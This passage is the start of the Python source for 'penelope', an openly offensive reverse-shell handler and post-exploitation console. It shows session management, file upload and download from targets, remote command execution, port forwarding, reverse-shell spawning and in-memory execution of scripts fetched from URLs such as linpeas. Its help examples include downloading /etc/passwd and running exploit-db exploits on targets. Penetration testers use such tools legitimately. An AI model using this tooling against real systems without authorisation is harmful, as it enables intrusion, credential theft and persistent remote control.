#!/usr/bin/env python3

# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.14.6"

import os
import io
import re
import sys
import tty
import ssl
import time
import shlex
import queue
import struct
import shutil
import socket
import signal
import base64
import termios
import tarfile
import logging
import zipfile
import inspect
import warnings
import platform
import threading
import subprocess
import socketserver

from math import ceil
from glob import glob
from json import dumps
from code import interact
from zlib import compress
from errno import EADDRINUSE, EADDRNOTAVAIL
from select import select
from pathlib import Path, PureWindowsPath
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
from datetime import datetime
from textwrap import indent, dedent
from binascii import Error as binascii_error
from functools import wraps
from collections import deque, defaultdict
from http.server import SimpleHTTPRequestHandler
from urllib.parse import unquote
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

################################## PYTHON MISSING BATTERIES ####################################
from string import ascii_letters
from random import choice, randint
rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
caller = lambda: inspect.stack()[2].function
bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))

def Open(item, terminal=False):
	if myOS != 'Darwin' and not DISPLAY:
		logger.error("No available $DISPLAY")
		return False

	if not terminal:
		program = 'xdg-open' if myOS != 'Darwin' else 'open'
		args = [item]
	else:
		if not TERMINAL:
			logger.error("No available terminal emulator")
			return False

		if myOS != 'Darwin':
			program = TERMINAL
			_switch = '-e'
			if program in ('gnome-terminal', 'mate-terminal'):
				_switch = '--'
			elif program == 'terminator':
				_switch = '-x'
			elif program == 'xfce4-terminal':
				_switch = '--command='
			args = [_switch, *shlex.split(item)]
		else:
			program = 'osascript'
			args = ['-e', f'tell app "Terminal" to do script "{item}"']

	if not shutil.which(program):
		logger.error(f"Cannot open window: '{program}' binary does not exist")
		return False

	process = subprocess.Popen(
		(program, *args),
		stdin=subprocess.DEVNULL,
		stdout=subprocess.DEVNULL,
		stderr=subprocess.PIPE
	)
	r, _, _ = select([process.stderr], [], [], .01)
	if process.stderr in r:
		error = os.read(process.stderr.fileno(), 1024)
		if error:
			logger.error(error.decode())
			return False
	return True


class Interfaces:

	def __str__(self):
		table = Table(joinchar=' : ')
		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
		for name, ip in self.list.items():
			table += [paint(name).cyan, paint(ip).yellow]
		return str(table)

	def oneLine(self):
		return '(' + str(self).replace('\n', '|') + ')'

	def translate(self, interface_name):
		if interface_name in self.list:
			return self.list[interface_name]
		elif interface_name in ('any', 'all'):
			return '0.0.0.0'
		else:
			return interface_name

	@staticmethod
	def ipa(busybox=False):
		interfaces = []
		current_interface = None
		params = ['ip', 'addr']
		if busybox:
			params.insert(0, 'busybox')
		for line in subprocess.check_output(params).decode().splitlines():
			interface = re.search(r"^\d+: (.+?):", line)
			if interface:
				current_interface = interface[1]
				continue
			if current_interface:
				ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
				if ip:
					interfaces.append((current_interface, ip[1]))
					current_interface = None # TODO support multiple IPs in one interface
		return interfaces

	@staticmethod
	def ifconfig():
		output = subprocess.check_output(['ifconfig']).decode()
		return re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)

	@property
	def list(self):
		if shutil.which("ip"):
			interfaces = self.ipa()

		elif shutil.which("ifconfig"):
			interfaces = self.ifconfig()

		elif shutil.which("busybox"):
			interfaces = self.ipa(busybox=True)
		else:
			logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
			return dict()

		return {i[0]:i[1] for i in interfaces}

	@property
	def list_all(self):
		return [item for item in list(self.list.keys()) + list(self.list.values())]


class Table:

	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
		self.list_of_lists = list_of_lists

		self.joinchar = joinchar

		if type(fillchar) is str:
			self.fillchar = [fillchar]
		elif type(fillchar) is list:
			self.fillchar = fillchar
#		self.fillchar[0] = self.fillchar[0][0]

		self.data = []
		self.max_row_len = 0
		self.col_max_lens = []
		if header: self.header = header
		for row in self.list_of_lists:
			self += row

	@property
	def header(self):
		...

	@header.setter
	def header(self, header):
		self.add_row(header, header=True)

	def __str__(self):
		self.fill()
		return "\n".join([self.joinchar.join(row) for row in self.data])

	def __len__(self):
		return len(self.data)

	def add_row(self, row, header=False):
		row_len = len(row)
		if row_len > self.max_row_len:
			self.max_row_len = row_len

		cur_col_len = len(self.col_max_lens)
		for _ in range(row_len - cur_col_len):
			self.col_max_lens.append(0)

		for _ in range(cur_col_len - row_len):
			row.append("")

		new_row = []
		for index, element in enumerate(row):
			if not isinstance(element, (str, paint)):
				element = str(element)
			elem_length = len(element)
			new_row.append(element)
			if elem_length > self.col_max_lens[index]:
				self.col_max_lens[index] = elem_length

		if header:
			self.data.insert(0, new_row)
		else:
			self.data.append(new_row)

	def __iadd__(self, row):
		self.add_row(row)
		return self

	def fill(self):
		for row in self.data:
			for index, element in enumerate(row):
				fillchar = ' '
				if index in [*self.fillchar][1:]:
					fillchar = self.fillchar[0]
				row[index] = element + fillchar * (self.col_max_lens[index] - len(element))


class Size:
	units = ("", "K", "M", "G", "T", "P", "E", "Z", "Y")
	def __init__(self, _bytes):
		self.bytes = _bytes

	def __str__(self):
		index = 0
		new_size = self.bytes
		while new_size >= 1024 and index < len(__class__.units) - 1:
			new_size /= 1024
			index += 1
		return f"{new_size:.1f} {__class__.units[index]}Bytes"

	@classmethod
	def from_str(cls, string):
		if string.isnumeric():
			_bytes = int(string)
		else:
			try:
				num, unit = int(string[:-1]), string[-1]
				_bytes = num * 1024 ** __class__.units.index(unit)
			except:
				logger.error("Invalid size specified")
				return # TEMP
		return cls(_bytes)


from datetime import timedelta
from threading import Thread, RLock, current_thread
class PBar:
	pbars = []

	def __init__(self, end, caption="", barlen=None, queue=None, metric=None):
		self.end = end
		if type(self.end) is not int: self.end = len(self.end)
		self.active = True if self.end > 0 else False
		self.pos = 0
		self.percent = 0
		self.caption = caption
		self.bar = '#'
		self.barlen = barlen
		self.percent_prev = -1
		self.queue = queue
		self.metric = metric
		self.check_interval = 1
		if self.queue: self.trace_thread = Thread(target=self.trace); self.trace_thread.start(); __class__.render_lock = RLock()
		if self.metric: Thread(target=self.watch_speed, daemon=True).start()
		else: self.metric = lambda x: f"{x:,}"
		__class__.pbars.append(self)
		print("\x1b[?25l", end='', flush=True)
		self.render()

	def __bool__(self):
		return self.active

	def __enter__(self):
		return self

	def __exit__(self, exc_type, exc_value, traceback):
		self.terminate()

	def trace(self):
		while True:
			data = self.queue.get()
			self.queue.task_done()
			if isinstance(data, int): self.update(data)
			elif data is None: break
			else: self.print(data)

	def watch_speed(self):
		self.pos_prev = 0
		self.elapsed = 0
		while self:
			time.sleep(self.check_interval)
			self.elapsed += self.check_interval
			self.speed = self.pos - self.pos_prev
			self.pos_prev = self.pos
			self.speed_avg = self.pos / self.elapsed
			if self.speed_avg: self.eta = int(self.end / self.speed_avg) - self.elapsed
			if self: self.render()

	def update(self, step=1):
		if not self: return False
		self.pos += step
		if self.pos >= self.end: self.pos = self.end
		self.percent = int(self.pos * 100 / self.end)
		if self.pos >= self.end: self.terminate()
		if self.percent > self.percent_prev: self.render()

	def render_one(self):
		self.percent_prev = self.percent
		left = f"{self.caption}["
		elapsed = "" if not hasattr(self, 'elapsed') else f" | Elapsed {timedelta(seconds=self.elapsed)}"
		speed = "" if not hasattr(self, 'speed') else f" | {self.metric(self.speed)}/s"
		eta = "" if not hasattr(self, 'eta') else f" | ETA {timedelta(seconds=self.eta)}"
		right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
		bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(right)
		bars = int(self.percent * bar_space / 100) * self.bar
		print(f'\x1b[2K{left}{bars.ljust(bar_space, ".")}{right}\n', end='', flush=True)

	def render(self):
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		for pbar in __class__.pbars: pbar.render_one()
		print(f"\x1b[{len(__class__.pbars)}A", end='', flush=True)
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()

	def print(self, data):
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		print(f"\x1b[2K{data}", flush=True)
		self.render()
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()

	def terminate(self):
		if self.queue and current_thread() != self.trace_thread: self.queue.join(); self.queue.put(None)
		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
		if not self: return
		self.active = False
		if hasattr(self, 'eta'): del self.eta
		if not any(__class__.pbars):
			self.render()
			print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
			__class__.pbars.clear()
		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()


class paint:
	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'orange':136, 'white':231, 'grey':244}
	_escape = lambda codes: f"\001\x1b[{codes}m\002"

	def __init__(self, text=None, colors=None):
		self.text = str(text) if text is not None else None
		self.colors = colors or []

	def __str__(self):
		if self.colors:
			content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
			return __class__._escape(';'.join(self.colors)) + content
		return self.text

	def __len__(self):
		return len(self.text)

	def __add__(self, text):
		return str(self) + str(text)

	def __mul__(self, num):
		return __class__(self.text * num, self.colors)

	def __getattr__(self, attr):
		self.colors.clear()
		for color in attr.split('_'):
			if color in __class__._codes:
				self.colors.append(str(__class__._codes[color]))
			else:
				prefix = "3" if color in __class__._colors else "4"
				self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
		return self


class CustomFormatter(logging.Formatter):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.templates = {
			logging.CRITICAL: {'color':"RED",     'prefix':"[!!!]"},
			logging.ERROR:    {'color':"red",     'prefix':"[-]"},
			logging.WARNING:  {'color':"yellow",  'prefix':"[!]"},
			logging.TRACE:    {'color':"cyan",    'prefix':"[•]"},
			logging.INFO:     {'color':"green",   'prefix':"[+]"},
			logging.DEBUG:    {'color':"magenta", 'prefix':"[DEBUG]"}
		}

	def format(self, record):
		template = self.templates[record.levelno]

		thread = ""
		if record.levelno is logging.DEBUG or options.debug:
			thread = paint(" ") + paint(threading.current_thread().name).white_CYAN

		prefix = "\x1b[2K\r"
		suffix = "\r\n"

		if core.wait_input:
			suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()

		elif core.attached_session:
			suffix += bytes(core.output_line_buffer).decode()

		text = f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}"
		return f"{prefix}{getattr(paint(text), template['color'])}{suffix}"


class LineBuffer:
	def __init__(self, length):
		self.len = length
		self.lines = deque(maxlen=self.len)

	def __lshift__(self, data):
		if isinstance(data, str):
			data = data.encode()
		if self.lines and not self.lines[-1].endswith(b'\n'):
			current_partial = self.lines.pop()
		else:
			current_partial = b''
		self.lines.extend((current_partial + data).split(b'\n'))
		return self

	def __bytes__(self):
		return b'\n'.join(self.lines)

def stdout(data, record=True):
	os.write(sys.stdout.fileno(), data)
	if record:
		core.output_line_buffer << data

def ask(text):
	try:
		try:
			return input(f"{paint(f'[?] {text}').yellow}")

		except EOFError:
			print()
			return ask(text)

	except KeyboardInterrupt:
		print("^C")
		return ' '

def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
	if threading.current_thread().name == 'MainThread':
		signal.signal(signal.SIGINT, keyboard_interrupt)

	if readline:
		readline.set_completer(completer)
		readline.set_completer_delims(completer_delims or default_readline_delims)
		readline.clear_history()
		if histfile:
			try:
				readline.read_history_file(histfile)
			except Exception as e:
				cmdlogger.debug(f"Error loading history file: {e}")
		#readline.set_auto_history(True)

	core.output_line_buffer << b"\n" + text.encode()
	core.wait_input = True

	try:
		response = original_input(text)

		if readline:
			#readline.set_completer(None)
			#readline.set_completer_delims(default_readline_delims)
			if histfile:
				try:
					readline.set_history_length(options.histlength)
					#readline.add_history(response)
					readline.write_history_file(histfile)
				except Exception as e:
					cmdlogger.debug(f"Error writing to history file: {e}")
			#readline.set_auto_history(False)
		return response
	finally:
		core.wait_input = False

class BetterCMD:
	def __init__(self, prompt=None, banner=None, histfile=None, histlen=None):
		self.prompt = prompt
		self.banner = banner
		self.histfile = histfile
		self.histlen = histlen
		self.cmdqueue = []
		self.lastcmd = ''
		self.active = threading.Event()
		self.stop = False

	def show(self):
		print()
		self.active.set()

	def start(self):
		self.preloop()
		if self.banner:
			print(self.banner)

		stop = None
		while not self.stop:
			try:
				try:
					self.active.wait()
					if self.cmdqueue:
						line = self.cmdqueue.pop(0)
					else:
						line = input(self.prompt, self.histfile, self.histlen, self.complete, " \t\n\"'><=;|&(:")

					signal.signal(signal.SIGINT, lambda num, stack: self.interrupt())
					line = self.precmd(line)
					stop = self.onecmd(line)
					stop = self.postcmd(stop, line)
					if stop:
						self.active.clear()
				except EOFError:
					stop = self.onecmd('EOF')
				except Exception:
					custom_excepthook(*sys.exc_info())
			except KeyboardInterrupt:
				print("^C")
				self.interrupt()
		self.postloop()

	def onecmd(self, line):
		cmd, arg, line = self.parseline(line)
		if cmd:
			try:
				func = getattr(self, 'do_' + cmd)
				self.lastcmd = line
			except AttributeError:
				return self.default(line)
			return func(arg)

	def default(self, line):
		cmdlogger.error("Invalid command")

	def interrupt(self):
		pass

	def parseline(self, line):
		line = line.lstrip()
		if not line:
			return None, None, line
		elif line[0] == '!':
			index = line[1:].strip()
			hist_len = readline.get_current_history_length()

			if not index.isnumeric() or not (0 < int(index) < hist_len):
				cmdlogger.error("Invalid command number")
				readline.remove_history_item(hist_len - 1)
				return None, None, line

			line = readline.get_history_item(int(index))
			readline.replace_history_item(hist_len - 1, line)
			return self.parseline(line)

		else:
			parts = line.split(' ', 1)
			if len(parts) == 1:
				return parts[0], None, line
			elif len(parts) == 2:
				return parts[0], parts[1], line

	def precmd(self, line):
		return line

	def postcmd(self, stop, line):
		return stop

	def preloop(self):
		pass

	def postloop(self):
		pass

	def do_reset(self, line):
		"""

		Reset the local terminal
		"""
		if shutil.which("reset"):
			os.system("reset")
		else:
			cmdlogger.error("'reset' command doesn't exist on the system")

	def do_exit(self, line):
		"""

		Exit cmd
		"""
		self.stop = True
		self.active.clear()

	def do_history(self, line):
		"""

		Show Main Menu history
		"""
		if readline:
			hist_len = readline.get_current_history_length()
			max_digits = len(str(hist_len))
			for i in range(1, hist_len + 1):
				print(f"  {i:>{max_digits}}  {readline.get_history_item(i)}")
		else:
			cmdlogger.error("Python is not compiled with readline support")

	def do_DEBUG(self, line):
		"""

		Open debug console
		"""
		import rlcompleter

		if readline:
			readline.clear_history()
			try:
				readline.read_history_file(options.debug_histfile)
			except Exception as e:
				cmdlogger.debug(f"Error loading history file: {e}")

		interact(banner=paint(
			"===> Entering debugging console...").CYAN, local=globals(),
			exitmsg=paint("<=== Leaving debugging console..."
		).CYAN)

		if readline:
			readline.set_history_length(options.histlength)
			try:
				readline.write_history_file(options.debug_histfile)
			except Exception as e:
				cmdlogger.debug(f"Error writing to history file: {e}")

	def completedefault(self, *ignored):
		return []

	def completenames(self, text, *ignored):
		dotext = 'do_' + text
		return [a[3:] for a in dir(self.__class__) if a.startswith(dotext)]

	def complete(self, text, state):
		if state == 0:
			origline = readline.get_line_buffer()
			line = origline.lstrip()
			stripped = len(origline) - len(line)
			begidx = readline.get_begidx() - stripped
			endidx = readline.get_endidx() - stripped
			if begidx > 0:
				cmd, args, foo = self.parseline(line)
				if cmd == '':
					compfunc = self.completedefault
				else:
					try:
						compfunc = getattr(self, 'complete_' + cmd)
					except AttributeError:
						compfunc = self.completedefault
			else:
				compfunc = self.completenames
			self.completion_matches = compfunc(text, line, begidx, endidx)
		try:
			return self.completion_matches[state]
		except IndexError:
			return None
	@staticmethod
	def file_completer(text):
		matches = glob(text + '*')
		matches = [m + '/' if os.path.isdir(m) else m for m in matches]
		#matches = [f"'{m}'" if ' ' in m else m for m in matches]
		return matches

##########################################################################################################

class MainMenu(BetterCMD):

	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
			"Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	@property
	def active_sessions(self):
		active_sessions = len(core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def get_core_id_completion(text, *extra, attr='sessions'):
		options = list(map(str, getattr(core, attr)))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	def set_id(self, ID):
		self.sid = ID
		session_part = (
				f"{paint('─(').cyan_DIM}{paint('Session').green} "
				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
		) if self.sid else ''
		self.prompt = (
				f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
				f"{session_part}{paint('>').cyan_DIM} "
		)

	def session_operation(current=False, extra=[]):
		def inner(func):
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if core.sessions:
							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
						else:
							cmdlogger.warning("No available sessions to perform this action")
						return False
				else:
					if ID:
						if ID.isnumeric() and int(ID) in core.sessions:
							ID = int(ID)
						elif ID not in extra:
							cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def interrupt(self):
		if core.attached_session and not core.attached_session.readline:
			core.attached_session.detach()
		else:
			if menu.sid and not core.sessions[menu.sid].agent: # TEMP
				core.sessions[menu.sid].control_session.subchannel.control << 'stop'

	def show_help(self, command):
		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
		parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = help_prompt.sub('', part)
			modified_parts.append(part)
		print(indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					cmdlogger.warning(
						f"No such command: '{command}'. "
						"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session_operation(extra=['none'])
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use 1		Select the SessionID 1
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		Show active sessions or interact with the SessionID

		Examples:

			sessions		Show active sessions
			sessions 1		Interact with SessionID 1
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for host, sessions in core.hosts.items():
					if not sessions:
						continue
					print('\n➤  ' + sessions[0].name_colored)
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							if session.host_needs_control_session and session.control_session is session:
								ID = paint(' ' + str(session.id)).cyan
							else:
								ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = session.listener or f'Connect({session._host}:{session.port})'
						table += [
							ID,
							paint(session.type).CYAN if session.type == 'PTY' else session.type,
							session.user or 'N/A',
							source
						]
					print("\n", indent(str(table), "    "), "\n", sep="")
			else:
				print()
				cmdlogger.warning("No sessions yet 😟")
				print()

	@session_operation()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact 1	Interact with SessionID 1
		"""
		return core.sessions[ID].attach()

	@session_operation(extra=['*'])
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill 1		Kill SessionID 1
			kill *		Kill all sessions
		"""

		if ID == '*':
			if not core.sessions:
				cmdlogger.warning("No sessions to kill")
				return False
			else:
				if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
					if options.maintain > 1:
						options.maintain = 1
						self.onecmd("maintain")
					for session in reversed(list(core.sessions.copy().values())):
						session.kill()
		else:
			core.sessions[ID].kill()

		if options.single_session and len(core.sessions) == 1:
			core.stop()
			logger.info("Penelope exited due to Single Session mode")
			return True

	@session_operation(current=True)
	def do_portfwd(self, line):
		"""
		host:port(<-|->)host:port
		Local and Remote port forwarding

		Examples:

			-> 192.168.0.1:80		Forward 127.0.0.1:80 to 192.168.0.1:80
			0.0.0.0:8080 -> 192.168.0.1:80	Forward 0.0.0.0:8080 to 192.168.0.1:80
		"""
		if not line:
			cmdlogger.warning("No parameters...")
			return False

		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
		if match:
			group1 = match.group(1)
			arrow = match.group(2)
			group2 = match.group(3)
		else:
			cmdlogger.warning("Invalid syntax")
			return False

		if arrow == '->':
			_type = 'L'
			lhost = "127.0.0.1"

			if group2:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
				if match:
					rhost = match.group(1)
					rport = match.group(2)
					lport = rport
				if not rport:
					cmdlogger.warning("At least remote port is required")
					return False
			else:
				cmdlogger.warning("At least remote port is required")
				return False

			if group1:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
				if match:
					lhost = match.group(1)
					lport = match.group(2)
				else:
					cmdlogger.warning("Invalid syntax")
					return False

		elif arrow == '<-':
			_type = 'R'

			if group2:
				rhost, rport = group2.split(':')

			if group1:
				lhost, lport = group1.split(':')
			else:
				cmdlogger.warning("At least local port is required")
				return False

		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))

	@session_operation(current=True)
	def do_download(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		if remote_items:
			core.sessions[self.sid].download(remote_items)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_open(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target and open them locally

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_items:
			items = core.sessions[self.sid].download(remote_items)

			if len(items) > options.max_open_files:
				cmdlogger.warning(
					f"More than {options.max_open_files} items selected"
					" for opening. The open list is truncated to "
					f"{options.max_open_files}."
				)
				items = items[:options.max_open_files]

			for item in items:
				Open(item)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_upload(self, local_items):
		"""
		<glob|URL>...
		Upload files / folders / HTTP(S)/FTP(S) URLs to the target
		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
		when the target has no Internet access

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
		"""
		if local_items:
			core.sessions[self.sid].upload(local_items, randomize_fname=True)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_script(self, local_item):
		"""
		<local_script|URL>
		In-memory local or URL script execution & real time downloaded output

		Examples:
			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if local_item:
			core.sessions[self.sid].script(local_item)
		else:
			cmdlogger.warning("No script to execute")

	@staticmethod
	def show_modules():
		categories = defaultdict(list)
		for module in modules().values():
			categories[module.category].append(module)

		print()
		for category in categories:
			print("  " + str(paint(category).BLUE))
			table = Table(joinchar=' │ ')
			for module in categories[category]:
				description = module.run.__doc__ or ""
				if description:
					description = module.run.__doc__.strip().splitlines()[0]
				table += [paint(module.__name__).red, description]
			print(indent(str(table), '  '), "\n", sep="")

	@session_operation(current=True)
	def do_run(self, line):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules"""
		try:
			parts = line.split(" ", 1)
			module_name = parts[0]
		except:
			module_name = None
			print()
			cmdlogger.warning(paint("Select a module").YELLOW_white)

		if module_name:
			module = modules().get(module_name)
			if module:
				args = parts[1] if len(parts) == 2 else ''
				module.run(core.sessions[self.sid], args)
			else:
				cmdlogger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session_operation(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn a new session.

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. On the other tab run: ./penelope.py 5555

			spawn 3333 10.10.10.10	Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				options.maintain = num
				refreshed = False
				for host in core.hosts.values():
					if len(host) < num:
						refreshed = True
						host[0].maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
			cmdlogger.info(f"Maintain value set to {paint(options.maintain).yellow} {status}")

	@session_operation(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		core.sessions[self.sid].upgrade()

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the session's local folder. If no session specified, open the base folder
		"""
		folder = core.sessions[self.sid].directory if self.sid else options.basedir
		Open(folder)
		print(folder)

	@session_operation(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a remote command

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			if core.sessions[self.sid].agent:
				core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					stdout_dst=sys.stdout.buffer,
					stderr_dst=sys.stderr.buffer
				)
			else:
				output = core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					value=True
				)
				print(output)
		else:
			cmdlogger.warning("No command to execute")

	'''@session_operation(current=True) # TODO
	def do_tasks(self, line):
		"""

		Show assigned tasks
		"""
		table = Table(joinchar=' | ')
		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

		for sessionid in core.sessions:
			tasks = core.sessions[sessionid].tasks
			for taskid in tasks:
				for stream in tasks[taskid]['streams'].values():
					if stream.closed:
						status = paint('Completed!').GREEN
						break
				else:
					status = paint('Active...').YELLOW

				table += [
					paint(sessionid).red,
					paint(taskid).cyan,
					paint(tasks[taskid]['pid']).blue,
					paint(tasks[taskid]['command']).yellow,
					paint(tasks[taskid]['streams']['1'].name).green,
					status
				]

		if len(table) > 1:
			print(table)
		else:
			logger.warning("No assigned tasks")'''

	def do_listeners(self, line):
		"""
		[<add|stop>[-i <iface>][-p <port>]]
		Add / stop / view Listeners

